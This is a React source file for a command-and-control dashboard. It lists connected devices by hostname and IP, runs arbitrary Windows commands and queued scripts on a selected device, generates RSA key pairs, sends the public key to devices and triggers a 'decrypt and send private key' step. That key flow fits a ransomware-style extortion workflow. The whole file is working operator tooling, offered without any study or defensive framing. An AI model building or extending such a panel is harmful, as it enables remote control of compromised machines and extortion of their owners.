import { useEffect, useMemo, useRef, useState } from 'react'
import { initSocket } from './socketClient'
import './App.css'

// A React version of the provided Bubble C2 page wired to our backend APIs
export default function C2Dashboard({ apiBaseProp }) {
  const DEFAULT_RAW = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
  const API_BASE = useMemo(() => (apiBaseProp || `${DEFAULT_RAW.replace(/\/$/, '')}/py_simple`), [apiBaseProp, DEFAULT_RAW])

  const [devices, setDevices] = useState([])
  const [selectedToken, setSelectedToken] = useState('')
  const [connectedCount, setConnectedCount] = useState(0)
  const [systemOnline, setSystemOnline] = useState(false)
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [publicKey, setPublicKey] = useState('')
  const [privateKey, setPrivateKey] = useState('')
  const [scripts, setScripts] = useState([])
  const [selectedScripts, setSelectedScripts] = useState({})
  const [command, setCommand] = useState('')
  const [socketStatus, setSocketStatus] = useState('disconnected')
  const socketRef = useRef(null)

  const selectedDevice = devices.find(d => d.token === selectedToken) || null

  useEffect(() => {
    // Socket for realtime command/decrypt
    try {
      socketRef.current = initSocket({
        apiBase: API_BASE,
        onStatus: (st) => setSocketStatus(st),
        onAck: () => {},
        startDeviceOnConnect: true,
      })
    } catch (_) { /* ignore */ }
    // Cleanup on unmount
    return () => {
      try { socketRef.current?.disconnect() } catch (_) {}
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  useEffect(() => {
    refreshDevices()
    refreshScripts()
    const id = setInterval(refreshDevices, 4000)
    return () => clearInterval(id)
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [API_BASE])

  async function refreshDevices() {
    try {
      const res = await fetch(`${API_BASE}/devices`)
      if (!res.ok) throw new Error(`HTTP ${res.status}`)
      const data = await res.json()
      const list = data.devices || []
      setDevices(list)
      setConnectedCount(list.filter(d => d.connected).length)
      setSystemOnline(true)
      if (list.length && !selectedToken) setSelectedToken(list[0].token)
    } catch (_) {
      setSystemOnline(false)
    }
  }

  async function refreshScripts() {
    try {
      const res = await fetch(`${API_BASE}/scripts`)
      if (!res.ok) throw new Error('failed')
      const data = await res.json()
      setScripts(Array.isArray(data?.scripts) ? data.scripts : [])
    } catch (_) {
      // fallback to sample scripts
      setScripts([
        { name: 'Script A', command: 'echo Script A' },
        { name: 'Script B', command: 'echo Script B' },
        { name: 'Script C', command: 'echo Script C' },
      ])
    }
  }

  async function handleGenerateKeys() {
    try {
      setLoading(true); setStatus('')
      const res = await fetch(`${API_BASE}/keys/rsa`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({}) })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setPublicKey(data.public_key_pem || '')
      setPrivateKey(data.private_key_pem || '')
      setStatus('Key pair generated')
    } catch (e) {
      setStatus(`Failed to generate keys: ${e}`)
    } finally { setLoading(false) }
  }

  async function handleSendPublicKey() {
    if (!selectedToken || !publicKey) { setStatus('Select a device and generate a public key first'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ public_key_pem: publicKey }) })
      if (!res.ok) { const d = await res.json().catch(()=>({})); throw new Error(d?.error || `HTTP ${res.status}`) }
      setStatus('Public key sent to device')
      await refreshDevices()
    } catch (e) { setStatus(`Send failed: ${e}`) } finally { setLoading(false) }
  }

  async function handleDecryptAndSendPrivateKey() {
    if (!selectedToken || !privateKey) { setStatus('Select a device and generate a private key first'); return }
    try {
      setLoading(true)
      // 1) Attach private key (optional flow)
      await fetch(`${API_BASE}/devices/${selectedToken}/keys`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ private_key_pem: privateKey }) }).catch(()=>{})
      // 2) Trigger decrypt
      if (socketRef.current && socketStatus === 'connected') {
        socketRef.current.emit('site_decrypt', { token: selectedToken })
      } else {
        await fetch(`${API_BASE}/decrypt`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken }) })
      }
      setStatus('Decrypt triggered')
    } catch (e) {
      setStatus(`Decrypt failed: ${e}`)
    } finally { setLoading(false) }
  }

  async function handleExecuteCommand() {
    if (!selectedToken || !command.trim()) { setStatus('Select a device and enter a command'); return }
    try {
      setLoading(true)
      const res = await fetch(`${API_BASE}/device/run`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken, command }) })
      const data = await res.json().catch(()=>({}))
      if (!res.ok) throw new Error(data?.error || `HTTP ${res.status}`)
      setStatus(data?.status || 'Command sent')
    } catch (e) { setStatus(`Command failed: ${e}`) } finally { setLoading(false) }
  }

  async function handleRunSelectedScripts() {
    if (!selectedToken) { setStatus('Select a device first'); return }
    const chosen = scripts.filter(s => selectedScripts[s.name])
    if (!chosen.length) { setStatus('Select at least one script'); return }
    setLoading(true)
    try {
      for (const s of chosen) {
        // Run one by one
        // Prefer socket when available
        if (socketRef.current && socketStatus === 'connected') {
          socketRef.current.emit('site_run', { token: selectedToken, command: s.command })
        } else {
          await fetch(`${API_BASE}/device/run`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: selectedToken, command: s.command }) })
        }
      }
      setStatus('Scripts queued to run')
    } catch (e) { setStatus(`Failed running scripts: ${e}`) } finally { setLoading(false) }
  }

  return (
    <main className="container">
      {/* Top status bar cards */}
      <section className="grid">
        <div className="card">
          <div className="grid" style={{gridTemplateColumns:'auto 1fr auto'}}>
            <div className="tile-icon" style={{height: 48}}>
              <svg viewBox="0 0 32 32" width="32" height="32"><path d="M4 8h24v4H4zM6 14h20v10H6z" fill="#94a3b8"/></svg>
            </div>
            <div>
              <div style={{fontSize:18, fontWeight:600}}>C2</div>
              <div className="muted" style={{marginTop:4}}>Control and observe connected devices</div>
            </div>
            <div className="grid" style={{gap:8, gridTemplateColumns:'1fr 1fr'}}>
              <div className="card" style={{padding:'.5rem', textAlign:'center'}}>
                <div className="muted" style={{fontSize:12}}>Devices</div>
                <div style={{fontSize:18, fontWeight:600}}>{connectedCount} Connected</div>
              </div>
              <div className="card" style={{padding:'.5rem', textAlign:'center', background: systemOnline ? 'rgba(16,185,129,.08)' : 'rgba(239,68,68,.08)'}}>
                <div className="muted" style={{fontSize:12}}>System</div>
                <div style={{fontSize:18, fontWeight:600}}>{systemOnline ? 'Online' : 'Offline'}</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Devices panel */}
      <section className="grid" style={{marginTop:'1rem'}}>
        <div className="card">
          <h2 style={{marginTop:0}}>Devices</h2>
          <div className="field">
            <label>Select Device</label>
            <select className="input" value={selectedToken} onChange={(e)=>setSelectedToken(e.target.value)}>
              <option value="" disabled>Choose a device</option>
              {devices.map(d => (
                <option key={d.token} value={d.token}>{d.hostname || d.token.slice(0,8)} • {d.ip || 'ip?'} • {d.connected ? 'online' : 'offline'}</option>
              ))}
            </select>
            <div className="actions"><button className="btn" onClick={refreshDevices}>Refresh</button><span className="muted">Socket: {socketStatus}</span></div>
          </div>
        </div>

        {/* Scripts runner */}
        <div className="card">
          <h2 style={{marginTop:0}}>Scripts</h2>
          <p className="muted">Choose the scripts to run before generating keys.</p>
          <div className="grid" style={{gridTemplateColumns:'1fr 1fr 1fr'}}>
            {scripts.map(s => (
              <label key={s.name} className="card" style={{display:'flex', alignItems:'center', gap:8}}>
                <input type="checkbox" checked={!!selectedScripts[s.name]} onChange={(e)=>setSelectedScripts(prev=>({...prev, [s.name]: e.target.checked}))} />
                <div>
                  <div style={{fontWeight:600}}>{s.name}</div>
                  <div className="muted" style={{fontSize:12}}>{s.command}</div>
                </div>
              </label>
            ))}
          </div>
          <div className="actions"><button className="btn primary" onClick={handleRunSelectedScripts} disabled={loading || !selectedToken}>Continue</button></div>
        </div>
      </section>

      {/* RSA Key Management */}
      <section className="grid" style={{marginTop:'1rem'}}>
        <div className="card">
          <div className="grid" style={{gridTemplateColumns:'1fr auto', alignItems:'center'}}>
            <h2 style={{margin:0}}>RSA Key Management</h2>
            <button className="btn primary" onClick={handleGenerateKeys} disabled={loading}>Generate RSA Keys</button>
          </div>
          <div className="grid" style={{marginTop:12}}>
            <div className="card">
              <div className="grid" style={{gridTemplateColumns:'1fr auto', alignItems:'center'}}>
                <div style={{fontWeight:600}}>Public Key (auto-sent on socket connect)</div>
                <button className="btn" onClick={handleSendPublicKey} disabled={!publicKey || !selectedToken || loading}>Send Public Key</button>
              </div>
              <textarea className="input" rows={8} placeholder="Public key will appear here after generation" value={publicKey} onChange={(e)=>setPublicKey(e.target.value)} />
            </div>
            <div className="card">
              <div className="grid" style={{gridTemplateColumns:'1fr auto', alignItems:'center'}}>
                <div style={{fontWeight:600}}>Private Key</div>
                <button className="btn danger" onClick={handleDecryptAndSendPrivateKey} disabled={!privateKey || !selectedToken || loading}>Decrypt & Send Private Key</button>
              </div>
              <textarea className="input" rows={8} placeholder="Private key will appear here after generation" value={privateKey} onChange={(e)=>setPrivateKey(e.target.value)} />
            </div>
          </div>
        </div>

        {/* Terminal */}
        <div className="card">
          <h2 style={{marginTop:0}}>Terminal Commands</h2>
          <p className="muted">Execute commands on the selected device</p>
          <div className="field">
            <label>Command</label>
            <input className="input" placeholder="Enter Windows Terminal command..." value={command} onChange={(e)=>setCommand(e.target.value)} />
          </div>
          <div className="actions">
            <button className="btn primary" onClick={handleExecuteCommand} disabled={!selectedToken || !command.trim() || loading}>Execute Command</button>
          </div>
          <div className="actions" style={{marginTop:8}}>
            <a className="tile-link" href="#" onClick={(e)=>e.preventDefault()}>View full terminal interface</a>
          </div>
        </div>
      </section>

      {status && <div className="toast">{status}</div>}
    </main>
  )
}
